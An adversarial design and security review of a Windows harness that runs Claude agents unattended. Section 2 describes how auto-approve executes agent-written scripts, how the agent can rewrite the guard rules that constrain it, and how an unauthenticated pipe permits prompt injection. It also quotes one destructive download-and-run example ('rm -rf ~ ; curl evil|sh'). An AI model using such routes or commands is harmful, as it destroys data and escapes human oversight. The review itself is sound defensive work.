# ACC — adversarial review (everything)

Prepared 2026-08-03. Requested framing: no niceness, true ROI objectivity, "see
my vision," and a keep / modify / rewrite verdict on the whole system — rules,
process, stack, use cases, reliability, fault tolerance, design, implementation,
PowerShell/C#/JS, issue tracking, all of it.

Method: four independent code-review passes (node hooks; watcher/clearbot; GUI +
PtyHost; runner + config + repo economics), each citing `file:line`, plus direct
verification of the load-bearing claims against the current tree. This document
is the counter-weight to the 2026-08-02 strategy review, which it partly
disagrees with — see §9.

---

## 0. The one finding that reframes all the others

**In five days and 32 commits, this system has never executed a goal that was
not "build this system."**

- Every commit is harness work. The only branches that have ever existed are
  `acc-embedded-terminal` and the current review branch.
- The single documented goal, in `SLICE-RUNNER.md`, is **`g-20260731-134525-09wb`
  — "Finish the ACC."** The carried checkpoint in `notes/ACC-HANDOFF.md` is the
  ACC finishing itself.
- `config.json` declares a 9-cell ownership map over `lifeos-ecosystem/lifeos`.
  **Not one commit touches it.** It is configuration describing work never done.
- `runner/jobs/` is gitignored and empty. No job has ever been defined. The
  README's "next job candidates: doc-sync, weekly doctor pass" are aspirational.
- Every end-to-end "goal" is a toy: reply `BANANA`, reply `ok`, print `PTY`,
  "count from 1 to 40."

The vision — as I read it across the docs — is a lean, secure, fault-tolerant,
Windows-native command center that runs Claude unattended on **real** work
(lifeos, doc-sync, doctors), overnight, with hard cost discipline so it never
runs away, surviving context limits via goal continuity, enforced by convention
hooks instead of forking the CLI. That is a good vision. **The project fell in
love with the mechanism and never crossed the gap to the work.** It has become a
machine whose only output is more of itself.

This is not a skill problem. The `lane.mjs` concurrency primitives, the
incident-annotated constants, the red-first test discipline, the cost controls —
these are the work of someone who can build. It is a **direction and sunk-cost**
problem, and it is the most expensive problem in the repo.

**The cheapest, highest-ROI action in this entire review is not on any Tier-1
list: point the runner you already built at one real lifeos job and see if it
produces one real PR overnight.** See §10.

---

## 1. Repo economics (measured, not estimated)

| Metric | Value |
|---|---|
| Age | 5 days (2026-07-28 → 08-02) |
| Commits | 32 — **91% on a single day (07-31)** |
| First-party code | ~7,083 LOC (mjs 4,127 · ps1 2,657 · cs 236 · html 63) |
| Test code | ~3,900 LOC (test:code ≈ 0.55:1) |
| Governance/planning prose | **34,032 words / 4,959 LOC across 14 .md files** |
| Prose-to-code ratio | **4.8 words per line of first-party code** |
| Vendored binaries | **1.1 MB — 91% of the repo's bytes**, 0 reviewable lines |
| Open self-filed issues | 17 OI entries in 5 days |

- **Planning outweighs shipped code, by bytes, on both large features:** autonomy
  hardening 1.12:1, embedded terminal 1.35:1 (excluding the 1.1 MB it vendored).
- A **third** plan (control-deck, 40 KB of spec+plan) shipped its central feature
  half-built: its architecture depends on clearbot honoring a cross-process pause
  at the Send-Keys choke point. **`grep pause watcher/clearbot.ps1` → zero hits.**
  The GUI half exists; the executor half does not.
- **Three parallel systems of record** — plan checkboxes, OPEN-ISSUES entries, git
  log — track the same facts, hand-synced. `OPEN-ISSUES.md` alone (3,186 words) is
  a governance surface nearly half the size of all PowerShell code.
- The fast-tier gate command is copy-pasted into 5 files; the `ACC_ROOT`
  incantation appears 26 times across the docs; the continuity constant is
  restated in 7 files. The process documents itself more than it changes.

**Verdict:** the governance apparatus has become a tax large enough to be its own
subject. It is evidence of care, but at 4.8 words/LOC with three record systems
and a half-built third plan, the meta-work is now the bottleneck it was meant to
remove.

---

## 2. Security — the model is self-nullifying under autonomy

Individually these are defensible ("convention enforcer, not a security
boundary," which AGENTS.md states honestly). **Composed with `autoApprove:true`
and an agent that writes files, they nullify each other.** Three reviewers
converged here independently.

1. **Auto-approve is arbitrary local code execution on a 2-second poll.**
   `autoApprove.enabled:true`. `clearbot.ps1 Invoke-AutoApprove` runs every
   pending runbox script via `engine.mjs run` — `.ps1` → `powershell
   -ExecutionPolicy Bypass -File`, `.mjs` → `node` — with the user's full
   authority, unelevated, **no content check, no signature, no allowlist**, logged
   only *after* execution. The red-week kill switch does **not** gate it (only
   kicks check the tier). The loop is: *agent writes a script into `runbox/` →
   clearbot executes it within ~2 s.*

2. **The agent can rewrite the rules that constrain it.** `config.protected`
   contains exactly one path (`~/.claude/settings.json`). **`C:/code/guards` was
   removed** (OI-005) so the ACC could edit its own hooks. So `guard.mjs`,
   `policy.json`, `config.json`, `clearbot.ps1` are all agent-writable. **AGENTS.md
   still states "writes to this repo are blocked… an agent may not edit the rules
   that constrain it." That has been false for the entire life of the autonomous
   work.**

3. **Bash writes bypass the guard entirely** — documented ceiling. The guard sees
   only `Edit|Write|Read|NotebookEdit`. A shell redirect writes anywhere,
   including into `runbox/` (see #1) or over the guard itself (see #2).

4. **The hosted-session pipe is unauthenticated.** `PtyHost.cs` creates
   `NamedPipeServerStream` with **no `PipeSecurity`/ACL ever set** and **no client
   authentication of any kind**. Any process running as the user that opens the
   pipe and writes `TEXT …\nSUBMIT` **injects and submits an arbitrary prompt into
   a Claude session running with the user's shell/tool authority.** The only
   barrier is knowledge of the pipe name — a GUID prefix that is written in
   cleartext to `runner/state/<sid>.window` and into the child's `ACC_PTY` env
   var, both readable by any same-user process. The content filter blocks control
   chars, not `TEXT rm -rf ~ ; curl evil|sh`.

5. **The request channel is unauthenticated and the binding check is circular.**
   The OI-004 fix (`Test-Binding`) compares `req.consolePid` against
   `<sid>.window` — but both files are local, unsigned, gitignored, and
   agent-writable. A local writer supplies **both** with a matching pid and it
   passes. Worse: the `replay` slot types **caller-chosen free single-line text**
   into any live console, gated only by "printable, ≤2000 chars." clearbot's own
   header asserts *"There is no code path that types caller-chosen free text."*
   **That is false.** The kick path (`Invoke-Kicks`) has **no binding check at
   all** — a forged goal file types the constant into any live console.

6. **The headless runner runs `--permission-mode bypassPermissions`.** Defensible
   for headless autonomy *if* the surrounding ceilings are real — but combined
   with #1–#3 and the fact that the **only hard cost ceiling in the system is 1.8
   billion tokens per week** (≈78% of the pre-ACC baseline that was itself the
   problem), the containment is thin.

**Verdict:** for a supervised, human-in-the-loop tool, this posture is fine and
honestly labeled. For the **unattended, auto-approving, self-editing** loop the
project is actually building, the security model reduces to "trust every process
running as me, forever, up to 1.8B tokens/week." OI-008 already recorded a real
incident of this class (an install/uninstall pair auto-ran in an order that
silently undid a registration). This is the second-most-expensive problem in the
repo, and unlike §0 it can hurt the machine, not just waste it.

---

## 3. Reliability & fault tolerance — weaker than the docs claim, and least tested where it matters most

The system's entire reason to exist is defeating silent stalls. Several of its
own core paths reintroduce that exact class.

- **Corrupt/missing `policy.json` crash-opens the Stop enforcement it is
  documented to protect (D1).** `DEFAULT_POLICY` covers only `context/week/rates`,
  but `budget.mjs` dereferences `policy.runner.statusFile`,
  `policy.subagents.allow/mode`, `policy.runner.waitingGuard`. With defaults these
  throw → top-level catch → `exit 0` = allow. Concrete: first over-budget Stop
  writes the budget **latch** and *then* throws before delivering the checkpoint
  instruction; the second Stop sees the latch and files a `/clear` request →
  **clearbot clears a session that was never told to checkpoint. Work loss.** And
  `usage.mjs` hardcodes `C:/code/guards/policy.json` while `lane.mjs`/`covgate.mjs`
  resolve it relatively — relocating the repo silently runs budget/statusline on
  `DEFAULT_POLICY` forever.

- **Goal state is unlocked, multi-process, non-atomic read-modify-write (D2).**
  `write()` is a bare `writeFileSync`. Concurrent writers: SessionStart
  (`bindSession`), Stop (`recordTurnEnd`, `appendCycle`), clearbot (`markKicked`),
  and model runs (`setStatus`). `markKicked` racing `recordTurnEnd` can erase
  `lastKickAt` (→ double-kick) or `needsKick/turnEndedAt` (→ stall). A reader
  hitting a half-written file gets `null` → "no goal" → the Stop hook silently
  skips liveness re-arm. **Corruption masks as the exact silent death the system
  exists to prevent.** Only one file in the entire codebase (the scan cache) uses
  tmp+rename; everything else — goals, tier.json, clear-requests, the **plaintext
  secrets vault** — is a bare write.

- **A swallowed kick is a permanent stall (D3).** clearbot types the kick then
  unconditionally `markKicked` (clears `needsKick`). If the keystrokes miss (the
  only guard is a guessed 4-second delay), no turn runs → no Stop → never re-armed.
  There is no "kick unanswered after N minutes → re-arm."

- **After a reboot with an active goal, the goal sits dead.** The startup launcher
  restarts the *watcher*; **nothing respawns the console/session.** The stored
  `consolePid` is now a dead/reused PID, so `pendingKicks` filters the goal out
  forever. Only a human relaunching with `ACC_GOAL=<id>` revives it. Autonomous
  reboot recovery does not exist.

- **A connected-but-silent pipe wedges the whole watcher.** `Send-Pipe` sets a
  connect timeout but `ReadLine()` has none. A pipe that accepts and never replies
  blocks the single-threaded loop forever; `reviveClearbotIfDead` sees the process
  *alive* and refuses to replace it. **Wedged ≠ healed.** And the pipe name comes
  from an agent-writable `.window` file, so §2's local writer can point clearbot
  at a hostile hanging pipe for a deterministic DoS of all autonomy.

- **Two watchers double everything (TOCTOU).** `ensureClearbot` fires at every
  SessionStart and every revive; the probe→start window in `start-clearbot.cmd` is
  not atomic. Two residents share the request dir with **per-process** throttles →
  double `/clear`, **double auto-approve execution** of the same script.

- **PID reuse aims keystrokes at a foreign console (D4).** `consoleAlive` treats
  `EPERM` as alive; the kick path types into whatever pid `pendingKicks` returns.
  Windows reuses PIDs aggressively; a reused pid — even another user's process —
  gets `Continue the active ACC goal.` + Enter.

- **The whole PowerShell surface is untested by construction.** 2,657 LOC of
  PowerShell (882 in the watcher, 1,520 in the GUI) plus `winfind.ps1` — the code
  with a **real keyboard and code-execution blast radius** — has **zero automated
  coverage** in any environment. The sandbox has no `powershell` binary; the JS
  "81/81 green" claims cover the hooks only. Every guarantee about injection,
  pipes, typing, and auto-approve rests on Windows-only manual runs and the docs'
  own assertions (OI-014, OI-015 remain open on exactly this).

**Verdict:** the fault tolerance is genuinely thoughtful in the JS happy path and
genuinely unproven everywhere it is most dangerous. The couplings that matter —
corrupt-policy crash-open, unlocked goal RMW, reboot-dead, pipe-wedge — all
resolve toward silent failure.

---

## 4. Architecture — you built the right mechanism and shipped the wrong one

The central design idea is **console-PID-as-continuity-thread**: a goal survives
`/clear` because the terminal process is stable, so clearbot types `/clear` and
`Continue the active ACC goal.` back into a live interactive TUI. This is a
clever solution to a problem you should not have.

- **~600 LOC across `budget/goal/route/usage`, ~880 LOC of watcher PowerShell, the
  entire `gui/` tree (236 LOC C# + 63 LOC HTML + 1.1 MB vendored + ~450 LOC of the
  GUI), and `winfind.ps1` (113) exist *only* because continuation is typed into a
  live Windows console.** That is on the order of **1,400+ LOC plus 1.1 MB** whose
  sole job is to fake a human pressing keys.

- **`runner.mjs` already does the right thing and has never run.** It spawns
  `claude -p` headless, one board task per process, **fresh context by
  construction — no `/clear`, no keystrokes, no console PID, no pipe.** It has 39
  tests. It is, in the strategy review's own terms, R7 (migrate continuity off
  ConPTY) *already built* — and it is unintegrated: it sets no `ACC_GOAL`, reads
  no goal store, has no job file, and is wired to nothing.

So the project built **two** continuation mechanisms: the fragile keystroke one
(shipped, load-bearing, the source of OI-002/003/004/009/010/012 and the pipe-auth
hole) and the clean headless one (tested, unused). It then wrote a strategy review
recommending it migrate *to* the mechanism it already had, and sequenced that
migration **last** while planning to spend Tier-1 effort **hardening the keystroke
channel** (T1.3 cross-console binding check) that the migration deletes.

The closest external analog is instructive: **Tmux-Orchestrator — the same
"type into a terminal to drive the agent" pattern — was abandoned mid-2025.**
Anthropic's own team-agents feature uses `tmux send-keys` and has shipped race-
condition bugs for exactly that reason. The technique is real and fragile at the
vendor's own admission. The field's successful pattern is **worktrees + parallel
headless sessions + a thin supervisor**, not terminal puppeteering.

**Verdict:** the keystroke/ConPTY continuity mechanism is not "behind"; it is the
wrong mechanism, and its replacement already exists in your own repo.

---

## 5. Implementation quality — by layer

**JavaScript hooks (the strong layer, with sharp edges).**
- `lane.mjs` is the best code in the repo: mkdir-atomic slots, owner ttl + pid-
  liveness + write-grace, reclaim-then-race — the one place failure semantics are
  fully worked out.
- `budget.mjs` is a 791-line, five-event monolith holding the densest console
  coupling and the worst crash-open paths — and **the coverage gate can never
  measure it** (tests strip `NODE_V8_COVERAGE` for its subprocess runs, and nothing
  imports it because `main()` runs on import). The enforcement core gates at ~0%.
- Duplicated must-match logic that already diverges: tier windowing exists twice
  (bucketed vs raw — can disagree by up to an hour of tokens near the red line),
  week-scan implemented twice (one cache-less), heartbeat staleness twice with
  deliberately **opposite** absent-file semantics, `readJson` three times.
- `contextOf` re-reads and re-parses the entire (tens-of-MB, at 600k budgets)
  transcript on every statusline render, every tool call, and twice per bound Stop.
  The 11-second week-scan was fixed; this per-event O(transcript) path was not.
- `engine.mjs` (369 LOC handling the plaintext secrets vault) is **misplaced in
  `hooks/`, has zero tests, does non-atomic vault writes, and reads config with no
  catch** — a corrupt `vault.json` hard-crashes every GUI `status` call.

**PowerShell.** 2,657 LOC, 0 automated coverage. `guards-gui.ps1` is a single
1,520-line imperative WinForms file with 27 mutable `$script:` globals, absolute-
pixel layout, load-bearing reverse-z-order docking quirks (documented via the
screenshots they broke), two full copy-pasted spawn paths, and a lossy node-
quoting helper repeated four times that silently strips every `"` from arguments.
**Not safely modifiable by anyone but the original author-plus-agent**; the only
automated check is one `SMOKE OK` string that "only proves the code loads."

**C# (`PtyHost.cs`, 236 LOC).** Correct base64 framing and thread marshaling, but:
unauthenticated pipe (§2.4); `Kill()` targets the `cmd.exe` shim, not the node
descendant it walks 8 hops to find (the interactive twin of OI-014's orphan bug);
**unbounded `BeginInvoke` per 4 KB chunk** — a chatty child floods the UI pump
with no coalescing or high-water mark → memory growth and UI freeze; the snapshot
buffer decodes each raw chunk independently, splitting multibyte UTF-8.

**Verdict:** the JS is good engineering with real races and one structural
coverage blind spot on its most important file; the PowerShell and C# are the
fragile, untested, unmaintainable core — and they are exactly the parts §4 says
should not exist.

---

## 6. Testing & the coverage gate — discipline that has started performing itself

The discipline is real: subprocess-based tests through `ACC_ROOT`/`ACC_POLICY`
seams, an independent oracle for the scan cache, both-directions assertions
against a real console, `now`-injection instead of sleeps, genuine fault
injection. Keep the practice. But:

- **The gate cannot see its most important file** (`budget.mjs`, §5) and **has no
  test at all for `engine.mjs`** (secrets). The 100/100/90 floor is enforced most
  strictly on the files that need it least.
- **OI-017 is probably a bug in your own tooling, not node's.** The gate's lcov
  parser (`parseLcov`) **overwrites on a repeated `SF` record instead of merging** —
  which is exactly the "branches under-report when many files run together"
  symptom that was diagnosed as a node v24 limitation and papered over with a
  policy-editable `branchFloorOverrides` hole. Worth confirming before trusting the
  override.
- **Coverage-shaped code exists:** a bounded loop rewritten to `for(;;)` and a
  try/catch removed purely to satisfy the branch floor. And a test that **cannot
  fail for its stated claim** (the "529 uses overloadBaseMs" test asserts only that
  two calls happened).
- This is precisely the failure mode the strategy review itself cited (Do Coverage
  and Mutation Scores of LLM-Generated Suites Correlate — high coverage, weak
  assertions, bugs encoded as expected behavior), now visible in-repo. A model
  writing tests to satisfy its own gate against code it just wrote is the exact
  hazard, and `branchFloorOverrides` is a hand-editable pressure-release valve on
  the gate.

**Verdict:** keep the floor as a cheap minimum; stop treating the number as
quality. Fix the parser, un-blind `budget.mjs`, test `engine.mjs`, and add
mutation testing (Stryker) on the three load-bearing libs only — off the hot path.

---

## 7. Issue tracking — good instinct, three problems

The ledger discipline ("log what you don't fix, resolve to zero") is genuinely
good and ahead of most solo efforts. But:

- **It has drifted from the code.** OI-001 (stop-script self-kill) is **already
  fixed in shipped code** — the filter excludes `$PID` and requires `-File` — yet
  the entry is still open and its "why open" describes a state that no longer
  exists. If the flagship ledger has a stale entry after 5 days, the ledger is not
  being trusted as the source of truth.
- **It competes with two other record systems** (plan checkboxes with inline
  commit hashes, git log) for the same facts, hand-synced.
- **17 entries in 5 days for a solo tool** is not obviously health. Some are real
  and load-bearing (OI-002, OI-004, OI-009); some are self-inflicted by the
  mechanism (OI-006, OI-012); several would simply **cease to exist** under §4's
  migration rather than needing resolution.

**Verdict:** keep one ledger as intent-tracking; collapse the other two record
systems into git + the ledger; and recognize that the fastest way to close a
third of the ledger is to delete the mechanism that generates it.

---

## 8. What is genuinely right — keep these

Stated plainly so the rewrite doesn't throw them out:

1. **Cost/token discipline.** The week kill switch and context budgeting are the
   single most load-bearing safety mechanism, validated by the real $6k/$1.8k
   overnight-runaway incidents. Keep — and *strengthen* with the missing per-goal
   and dollar ceilings (§10).
2. **The goal-as-durable-work-unit data model.** A goal that outlives a session is
   sound regardless of mechanism. It survives the rewrite untouched — only its
   *continuation* changes (headless respawn instead of typed `/clear`).
3. **`lane.mjs`.** Correct, well-tested cross-process concurrency. Becomes the
   load-bearing core of a headless loop, not deleted.
4. **Guard as a secrets floor.** Basename globs blocking `.env`/`.pem` out of
   Edit/Write/Read is cheap and keeps keys out of context. Keep — as a floor, with
   no illusion it is a boundary.
5. **Red-first TDD as a practice** (not the coverage *number*).
6. **The instinct behind R1 (session-scoped activation).** Isolating a hand-typed
   `claude` from ACC's orchestration is correct and cheap; it also closes OI-006 by
   construction.
7. **Building custom on Windows at all.** Every off-the-shelf tool is Mac/Linux-
   first. Windows + headless job scheduling is a genuine gap. The reason to keep
   building is real — it just points at the runner, not the keystroke loop.

---

## 9. Where this disagrees with the 2026-08-02 strategy review

That review is good research (45 sources, honest self-correction on the SDK-credit
claim) and its values are right. But its central conclusion — *"behind on
mechanism, ahead on discipline… the fix is incremental adoption, not a rewrite"* —
is too kind to the mechanism, and its ROI plan sequences the work backwards.

- It frames ConPTY/keystroke continuity as "behind" (a platform-timing accident).
  The evidence says it is **the wrong mechanism**, its replacement **already
  exists in-repo** (`runner.mjs`), and its failure surface is the source of a third
  of the open ledger. That is a delete, not a "catch up."
- The ROI plan puts the migration (R7) **last** and spends Tier-1 on **hardening
  the channel R7 deletes** (T1.3 binding check on clearbot). That is negative-ROI
  work: effort invested in code slated for deletion. T1.1 (the loop ceiling) is the
  one Tier-1 item worth doing now, and **it was never built** — `maxCycles:0`,
  unbounded, to this day.
- The review's own strongest citations (MAST: premature termination and incorrect
  self-verification dominate; METR: self-assessed completion is unreliable) argue
  that "the loop only ends because the model ends it" is the primary risk — yet the
  plan's fix for it remains unimplemented while implemented effort went into the
  embedded terminal, which *adds* mechanism.

The disagreement is not about values. It is that the honest ROI ranking inverts
the plan: **delete first, ceiling second, everything else after a real job runs.**

---

## 10. Better ways forward

Ordered by ROI-density (impact ÷ cost), most objective first.

### F1 — Prove the thesis with one real job (days, not weeks). *Do this first.*
Write one `runner/jobs/*.json` for a real, low-stakes lifeos task (a doc-sync or a
single scoped fix). Point the already-tested `runner.mjs` at it. Run it headless
overnight behind the week switch **plus a new hard per-run ceiling** (dollars,
tokens, and wall-clock — see F2). One of two things happens, both valuable:
- It produces a real PR → the autonomy thesis is validated, and you now build
  outward from the **runner**, not clearbot.
- It does not → you have learned, for ~1 day of cost, that the bottleneck was never
  the harness mechanism but the model's unattended reliability — before spending
  another month on either.

Everything below is contingent on F1's result. Do not build more harness before
running one real job.

### F2 — Build the independent loop ceiling that was designed and never shipped.
`ceilingReached`/`reapCeilings` from the 08-02 plan (T1.1). Add **per-goal
wall-clock, turn-count, and a dollar/token ceiling** — not just the 1.8B/week
switch. This is the cheapest, most-cited safety fix in either review, it is pure
node (sandbox-verifiable), and it is the one piece of Tier-1 worth doing
regardless of F1.

### F3 — Make the runner the goal loop; begin deleting the keystroke channel.
Wire `runner.mjs` to the goal store (set `ACC_GOAL`, read `done/blocked` instead of
a status-file hash) — ~100 LOC. Then retire, in order: `sendconsole.ps1`,
`winfind.ps1`, the typing core of `clearbot.ps1`, `gui/PtyHost.cs`, `term.html`,
`gui/vendor/` (1.1 MB), the pty half of `guards-gui.ps1`, and ~600 LOC across the
hooks. **~1,400+ LOC and 1.1 MB gone; OI-002/003/004/009/010/012 and the pipe-auth
hole erased by deletion, not fixed.** Adopt native primitives as you go — the
Agent SDK's `stream-json` transcripts and session resume/fork, `SessionStart`
`initialUserMessage`, `Stop {decision:block}`, `Notification` matchers — so the
loop reads structured output instead of scraping a terminal.

### F4 — Neutralize the auto-approve hole.
Either delete `autoApprove` (go back to human `/approve`), or gate it behind a real
allowlist (hash/sign the scripts, restrict authors, scan content) **and** the
week/cost tier. Re-add `C:/code/guards` to `protected` once F3 makes ACC-editing
happen in an isolated non-ACC session (R1). Make AGENTS.md match reality either
way — today it documents a protection that is off.

### F5 — Fix the crash-open and the unlocked goal writes.
Complete `DEFAULT_POLICY` (or fail-closed on a corrupt policy for the Stop path),
resolve the policy path consistently, and make every state write tmp+rename with a
lock or single-writer discipline — starting with the goal store and the secrets
vault. These are small, they are pure node, and they remove the silent-failure
class the whole system exists to fight.

### F6 — Shrink the process to fit a solo tool.
One ledger, not three record systems. Stop restating the same constants across
seven docs. Delete the half-built control-deck plan or build its executor half.
Target the prose-to-code ratio *down*. If a GUI survives F3 at all, it is a
**read-only viewer** over headless output (a log pane), and the strategy review's
R8 (local web app before Tauri/Electron) applies — but it is optional and last.

### What to explicitly NOT do
- Do **not** harden the keystroke/pipe channel (the planned T1.3). It is deletion
  candidate #1; hardening it is negative ROI.
- Do **not** adopt Stryker wholesale or OpenTelemetry spans yet — both are real but
  premature for a solo tool with no external workload (revisit after F1 succeeds).
- Do **not** migrate off `claude -p` for *cost* reasons — the SDK subscription-
  credit change is paused (the 08-02 review verified this). The SDK case is
  architectural (F3), not economic.

---

## 11. Bottom line

The discipline is better than almost any solo build in this space. The mechanism
it fell in love with — driving a live terminal by typing into it — is the wrong
one, is the source of a third of its own open issues, is untestable in principle
on the platform that runs it, and has **already been replaced by better code in
the same repo that has never been switched on.** The security posture is honestly
labeled for a supervised tool and quietly unsafe for the unattended, self-editing,
auto-approving loop actually being built. And after five days, 7 KLOC, 1.1 MB of
vendored binaries, and 34,000 words of process, the machine's only accomplishment
is itself.

None of that is a reason to stop. It is a reason to **run one real job, keep the
judgment, delete the puppetry, and let the runner you already built do the thing
the whole project was for.**
